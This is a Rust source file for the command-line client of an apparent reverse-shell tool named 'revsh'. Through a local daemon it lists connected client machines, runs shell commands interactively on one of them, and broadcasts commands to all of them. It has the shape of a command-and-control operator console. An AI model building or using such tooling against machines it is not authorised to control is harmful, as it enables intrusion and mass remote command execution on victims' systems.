use tokio::net::UnixStream;
use std::io::{ Write, BufRead };
use clap::Parser;

use revsh_common::*;
use revsh_server::*;

#[derive(Parser, Debug)]
struct Args {
    #[command(subcommand)]
    action: Action,
}

#[derive(clap::Subcommand, Debug)]
enum Action {
    #[command(name = "list")]
    ListClients {
        
    },
    #[command(name = "run")]
    RunCommand {
        #[arg(short, long)]
        detach: bool,
        target: UID,
        command: String,
    },
    #[command(name = "broadcast")]
    RunBroadcast {
        #[arg(short, long)]
        detach: bool,
        command: String,
    },
}
  
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    println!("Connecting to deamon...");
    let mut stream = UnixStream::connect("/tmp/revsh/ipc").await
        .expect("Deamon not running");
    println!("Connected to deamon");
    
    match args.action {
        Action::ListClients {  } => {
            send_message_into(
                &InCliMessage::ListClients {
                    page_size: 0,
                    page_index: 1000
                },
                &mut stream,
            ).await.unwrap();
            
            let mut users = loop {
                let e: OutCliMessage = recv_message_from(&mut stream).await.unwrap();
                match e {
                    OutCliMessage::ClientList { users } => break users,
                    _ => (),
                }
            };
            users.sort_by_key(|users| users.uid);

            let max_id = users.iter().map(|a| a.uid).max().unwrap_or(0);
            let longest_addr = users.iter()
                .map(|a| format!("{:?}", a.addr).len()).max().unwrap_or(0);
            let age_length = users.iter()
                .map(|a| format!("{}", (chrono::Utc::now() - a.connected_at).num_seconds()).len()).max().unwrap_or(0);
            let id_length = format!("{max_id}").len();
            println!("--{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length));
            for user in users {
                println!(
                    "| {id:0id_length$} | {addr:?} | {age:0age_length$}s |",
                    id = user.uid,
                    id_length = id_length,
                    addr = user.addr,
                    age = (chrono::Utc::now() - user.connected_at).num_seconds(),
                    age_length = age_length
                );
            }
            println!("--{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length));
        },
        Action::RunCommand { target, command, detach } => {
            let created_id = new_uid();
            send_message_into(
                &InCliMessage::SendMessageTo {
                    target,
                    message: S2CMessage::Execute {
                        pid: created_id,
                        exe: "sh".into(),
                        args: vec!["-c".into(), command],
                        print_output: true
                    },
                },
                &mut stream,
            ).await.unwrap();
            
            if detach { return Ok(()) };
            
            let (mut reader, mut writer) = stream.into_split();
            
            tokio::spawn(async move {
                loop {
                    let line = tokio::task::block_in_place(|| {
                        let mut stdin = std::io::stdin().lock();
                        let mut str = String::new();
                        stdin.read_line(&mut str).unwrap();
                        str
                    });
                    send_message_into(&InCliMessage::SendMessageTo {
                        target,
                        message: S2CMessage::Input {
                            target_pid: created_id,
                            data: line.into_bytes().into_boxed_slice(),
                        },
                    }, &mut writer).await.unwrap();
                }
            });

            loop {
                let e: OutCliMessage = recv_message_from(&mut reader).await.unwrap();
                match e {
                    OutCliMessage::ClientMessage {
                        sender,
                        message: C2SMessage::ProcessOutput { pid, data }
                    } if sender == target && pid == created_id => {
                        let mut a = std::io::stdout().lock();
                        a.write_all(&data).unwrap();
                        a.flush().unwrap();
                    },
                    OutCliMessage::ClientMessage {
                        sender,
                        message: C2SMessage::ProcessStopped { pid, exit_code }
                    } if sender == target && pid == created_id => {
                        std::process::exit(exit_code);
                    },
                    _ => (),
                }
            };
        },
        Action::RunBroadcast { command, detach } => {
            let created_id = new_uid();
            send_message_into(
                &InCliMessage::BroadcastMessage {
                    message: S2CMessage::Execute {
                        pid: created_id,
                        exe: "sh".into(),
                        args: vec!["-c".into(), command],
                        print_output: false
                    },
                },
                &mut stream,
            ).await.unwrap();

            if detach { return Ok(()) };

            loop {
                let e: OutCliMessage = recv_message_from(&mut stream).await.unwrap();
                match e {
                    OutCliMessage::ClientMessage {
                        sender: _,
                        message: C2SMessage::ProcessOutput { pid, data }
                    } if pid == created_id => {
                        let mut a = std::io::stdout().lock();
                        a.write_all(&data).unwrap();
                    },
                    _ => (),
                }
            };
        }
    }
  
    Ok(())
}
